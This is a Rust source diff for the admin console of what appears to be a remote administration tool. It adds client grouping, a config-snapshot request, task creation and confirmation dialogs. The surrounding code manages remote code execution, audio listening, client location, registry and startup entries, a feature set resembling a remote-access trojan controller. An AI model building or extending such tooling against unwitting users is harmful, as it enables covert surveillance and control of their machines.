@@ -1,6 +1,7 @@
 mod about;
 mod audio_udp;
 mod client_builder;
+mod client_groups;
 mod client_map;
 mod client_registry;
 mod client_state;
@@ -23,6 +24,7 @@ use self::{
         AudioUdpSender, AudioUdpSession, PendingAudioFrame,
     },
     client_builder::ClientBuilderState,
+    client_groups::{MoveGroupAction, MoveGroupWindow},
     client_map::ClientMapWindow,
     client_state::{
         client_commands_disabled_text, client_identity_label, client_location_label,
@@ -192,6 +194,8 @@ struct AdminApp {
     audio_playback_registry: live_control::audio_listen::AudioPlaybackRegistry,
     connected: bool,
     clients: Vec<ClientRow>,
+    client_groups: HashMap<String, String>,
+    move_group_window: MoveGroupWindow,
     client_filter: String,
     client_builder_open: bool,
     client_builder: ClientBuilderState,
@@ -265,6 +269,8 @@ impl AdminApp {
             audio_playback_registry,
             connected: false,
             clients: Vec::new(),
+            client_groups: client_groups::load_client_groups(),
+            move_group_window: MoveGroupWindow::default(),
             client_filter: String::new(),
             client_builder_open: false,
             client_builder,
@@ -774,6 +780,11 @@ impl AdminApp {
     }
 
     fn send_command(&mut self, client_id: &str, command: CommandKind) {
+        if command == CommandKind::MoveToGroup {
+            self.open_move_group_window(client_id);
+            return;
+        }
+
         if !self
             .client_status_for(client_id)
             .map(ClientStatus::can_receive_commands)
@@ -796,6 +807,16 @@ impl AdminApp {
             return;
         }
 
+        if command == CommandKind::ClientConfig {
+            self.open_session_command_window(client_id, command.clone());
+            let _ = self.input_tx.send(AdminInput::Command {
+                target_id: client_id.to_string(),
+                command,
+                payload: "action=show".to_string(),
+            });
+            self.push_log(format!("requested client config snapshot from {client_id}"));
+            return;
+        }
         if session_command_requires_confirmation(&command) {
             self.open_session_command_window(client_id, command);
             return;
@@ -834,7 +855,10 @@ impl AdminApp {
         }
         if matches!(
             command,
-            CommandKind::ExecuteFile | CommandKind::ExecuteCode | CommandKind::ExecuteStaticCommand
+            CommandKind::ExecuteFile
+                | CommandKind::ExecuteCode
+                | CommandKind::ExecuteStaticCommand
+                | CommandKind::CreateTask
         ) {
             self.open_execute_window(client_id, command);
             return;
@@ -972,6 +996,55 @@ impl AdminApp {
         );
     }
 
+    fn open_move_group_window(&mut self, client_id: &str) {
+        let label = self
+            .clients
+            .iter()
+            .find(|row| row.info.id == client_id)
+            .map(|row| client_identity_label(&row.info))
+            .unwrap_or_else(|| client_id.to_string());
+        let group = self.client_group(client_id).to_string();
+        self.move_group_window.open(client_id, label, &group);
+    }
+
+    fn apply_move_group_action(&mut self, action: MoveGroupAction) {
+        match action {
+            MoveGroupAction::Save { client_id, group } => {
+                let group = client_groups::clean_group_name(&group);
+                if group.is_empty() {
+                    self.client_groups.remove(&client_id);
+                } else {
+                    self.client_groups.insert(client_id.clone(), group.clone());
+                }
+                match client_groups::save_client_groups(&self.client_groups) {
+                    Ok(()) => {
+                        self.move_group_window.close();
+                        if group.is_empty() {
+                            self.push_log(format!("client {client_id} group cleared"));
+                        } else {
+                            self.push_log(format!("client {client_id} moved to group {group}"));
+                        }
+                    }
+                    Err(error) => self
+                        .move_group_window
+                        .set_error(format!("{}: {error}", t("Save group failed"))),
+                }
+            }
+            MoveGroupAction::Clear { client_id } => {
+                self.client_groups.remove(&client_id);
+                match client_groups::save_client_groups(&self.client_groups) {
+                    Ok(()) => {
+                        self.move_group_window.close();
+                        self.push_log(format!("client {client_id} group cleared"));
+                    }
+                    Err(error) => self
+                        .move_group_window
+                        .set_error(format!("{}: {error}", t("Save group failed"))),
+                }
+            }
+        }
+    }
+
     fn open_command_window(&mut self, client_id: &str, command: CommandKind) {
         let (hostname, username) = self.client_window_identity(client_id);
         self.command_windows.push(CommandResultWindow {
@@ -981,13 +1054,15 @@ impl AdminApp {
             username,
             command,
             status: CommandResultStatus::Pending,
-            detail: "Waiting for client result...".to_string(),
+            detail: t("Waiting for client result...").to_string(),
             open: true,
             close_requested: Arc::new(AtomicBool::new(false)),
             refresh_requested: Arc::new(AtomicBool::new(false)),
             auto_refresh_enabled: Arc::new(AtomicBool::new(false)),
             last_auto_refresh_at: None,
+            process_kill_confirm: Arc::new(Mutex::new(None)),
             process_kill_requested: Arc::new(Mutex::new(None)),
+            startup_delete_confirm: Arc::new(Mutex::new(None)),
             startup_action_requested: Arc::new(Mutex::new(None)),
             registry_key_requested: Arc::new(Mutex::new(None)),
             startup_add_form: Arc::new(Mutex::new(StartupAddForm::default())),
@@ -1012,6 +1087,13 @@ impl AdminApp {
             .find(|row| row.info.id == client_id)
             .map(|row| (row.info.hostname.clone(), row.info.username.clone()))
             .unwrap_or_else(|| ("unknown-host".to_string(), "unknown-user".to_string()))
+    }
+
+    fn client_group(&self, client_id: &str) -> &str {
+        self.client_groups
+            .get(client_id)
+            .map(String::as_str)
+            .unwrap_or("")
     }
 
     fn client_gui_available(&self, client_id: &str) -> bool {
@@ -1102,6 +1184,17 @@ impl AdminApp {
             accepted,
             &detail,
         ) {
+            return;
+        }
+        if command == CommandKind::ClientConfig
+            && crate::session::handle_client_config_ack(
+                &mut self.session_command_windows,
+                &client_id,
+                accepted,
+                &detail,
+            )
+        {
+            self.push_log(format!("client config snapshot received from {client_id}"));
             return;
         }
         if session_command_requires_confirmation(&command) {
@@ -1212,7 +1305,9 @@ impl AdminApp {
             refresh_requested: Arc::new(AtomicBool::new(false)),
             auto_refresh_enabled: Arc::new(AtomicBool::new(false)),
             last_auto_refresh_at: None,
+            process_kill_confirm: Arc::new(Mutex::new(None)),
             process_kill_requested: Arc::new(Mutex::new(None)),
+            startup_delete_confirm: Arc::new(Mutex::new(None)),
             startup_action_requested: Arc::new(Mutex::new(None)),
             registry_key_requested: Arc::new(Mutex::new(None)),
             startup_add_form: Arc::new(Mutex::new(StartupAddForm::default())),
@@ -1601,7 +1696,9 @@ impl AdminApp {
             let close_requested = window.close_requested.clone();
             let refresh_requested = window.refresh_requested.clone();
             let auto_refresh_enabled = window.auto_refresh_enabled.clone();
+            let process_kill_confirm = window.process_kill_confirm.clone();
             let process_kill_requested = window.process_kill_requested.clone();
+            let startup_delete_confirm = window.startup_delete_confirm.clone();
             let startup_action_requested = window.startup_action_requested.clone();
             let registry_key_requested = window.registry_key_requested.clone();
             let startup_add_form = window.startup_add_form.clone();
@@ -1640,7 +1737,9 @@ impl AdminApp {
                                                 status,
                                                 CommandResultStatus::Pending
                                             ),
+                                            process_kill_confirm: &process_kill_confirm,
                                             process_kill_requested: &process_kill_requested,
+                                            startup_delete_confirm: &startup_delete_confirm,
                                             startup_action_requested: &startup_action_requested,
                                             registry_key_requested: &registry_key_requested,
                                             startup_add_form: &startup_add_form,
